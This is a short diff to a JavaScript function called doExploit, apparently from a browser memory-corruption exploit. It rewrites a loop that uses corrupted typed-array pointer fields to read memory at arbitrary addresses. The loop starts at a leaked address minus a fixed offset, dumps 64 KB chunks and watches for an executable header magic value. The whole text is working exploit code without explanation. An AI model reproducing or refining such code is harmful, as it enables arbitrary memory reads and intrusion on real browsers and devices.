@@ -121,26 +121,29 @@ function doExploit(buf, stale, temp) {
 	buf[5] = hi;
 	dumptemp(16);
 	log('!!!!!!!!!!!!');
-	lo = (temp[4] & 0xFFFFF000) >>> 0;
-	hi = temp[5] >>> 0;
+	var lo = (temp[4] - 0x835e5c) >>> 0;
+	if(temp[4] < 0x835e5c)
+		hi = (temp[5] - 1) >>> 0;
+	else
+		hi = temp[5] >>> 0;
+	
 	var ctr = 0;
-	while(true) {
+	for(var i = 0; i < 901; ++i) {
 		buf[4] = lo;
 		buf[5] = hi;
-		buf[6] = 0x1000;
-		memdump(lo, hi, temp, 4096 >> 4);
+		buf[6] = 65536;
+		memdump(lo, hi, temp, 65536 >> 4);
 
-		if(lo == 0) {
-			hi -= 1;
-			lo = 0xFFFFF000 >>> 0;
-		} else {
-			lo = (lo - 0x1000) >>> 0;
+		if(temp[4] == 0x304F524E) {
+			log('Beginning');
 		}
 
-		/*if(ctr++ == 100) {
-			alert(1);
-			ctr = 0;
-		}*/
+		if(lo == 0xFFFF0000) {
+			hi += 1;
+			lo = 0;
+		} else {
+			lo = (lo + 0x10000) >>> 0;
+		}
 	}
 }
 
